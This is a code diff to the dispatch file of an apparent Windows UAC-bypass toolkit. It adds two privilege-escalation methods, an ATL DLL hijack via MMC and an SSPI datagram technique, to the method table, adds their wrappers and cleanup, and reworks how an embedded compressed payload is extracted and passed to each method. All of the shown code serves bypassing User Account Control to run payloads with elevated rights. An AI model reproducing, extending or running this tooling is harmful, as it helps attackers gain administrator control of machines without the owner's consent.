@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2022
+*  (C) COPYRIGHT AUTHORS, 2015 - 2023
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.63
+*  VERSION:     3.65
 *
-*  DATE:        16 Jul 2022
+*  DATE:        22 Sep 2023
 *
 *  UAC bypass dispatch.
 *
@@ -50,6 +50,8 @@ UCM_API(MethodDotNetSerial);
 UCM_API(MethodVFServerTaskSched);
 UCM_API(MethodVFServerDiagProf);
 UCM_API(MethodIscsiCpl);
+UCM_API(MethodAtlHijack);
+UCM_API(MethodSspiDatagram);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -63,7 +65,9 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodPca,
     UacMethodCurVer,
     UacMethodVFServerTaskSched,
-    UacMethodVFServerDiagProf
+    UacMethodVFServerDiagProf,
+    UacMethodAtlHijack,
+    UacMethodSspiDatagram
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -144,6 +148,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
+    { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -223,8 +229,6 @@ VOID PostCleanupAttempt(
     _In_ UCM_METHOD Method
 )
 {
-    BOOL bHit = TRUE;
-
     switch (Method) {
 
     case UacMethodDISM:
@@ -234,7 +238,7 @@ VOID PostCleanupAttempt(
 
     case UacMethodWow64Logger:
     case UacMethodVFServerDiagProf:
-        ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL);
+        ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL, NULL);
         break;
 
     case UacMethodSXSConsent:
@@ -253,8 +257,11 @@ VOID PostCleanupAttempt(
         ucmIscsiCplMethodCleanup();
         break;
 
+    case UacMethodAtlHijack:
+        ucmMethodCleanupSingleItemSystem32(ATL_DLL, WBEM_DIR);
+        break;
+
     default:
-        bHit = FALSE;
         break;
 
     }
@@ -315,14 +322,25 @@ NTSTATUS MethodsManagerCall(
 
     if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {
 
-        Resource = supLdrQueryResourceData(
+        Status = supLdrQueryResourceDataEx(
             Entry->PayloadResourceId,
             ImageBaseAddress,
-            &DataSize);
+            &DataSize,
+            &Resource);
 
-        if (Resource) {
-            PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);
+        if (!NT_SUCCESS(Status)) {
+
+            if (Status == STATUS_RESOURCE_TYPE_NOT_FOUND)
+                return STATUS_INVALID_IMAGE_FORMAT;
+
+            return Status;
         }
+
+        if (DataSize == 0 || Resource == NULL) {
+            return STATUS_INVALID_IMAGE_FORMAT;
+        }
+
+        PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);
 
         if ((PayloadCode == NULL) || (PayloadSize == 0)) {
             return STATUS_DATA_ERROR;
@@ -802,6 +820,21 @@ UCM_API(MethodVFServerDiagProf)
 UCM_API(MethodIscsiCpl)
 {
     return ucmIscsiCplMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodAtlHijack)
+{
+    return ucmAtlHijackMethod(MMC_EXE,
+        ATL_DLL,
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodSspiDatagram)
+{
+    return ucmSspiDatagramMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
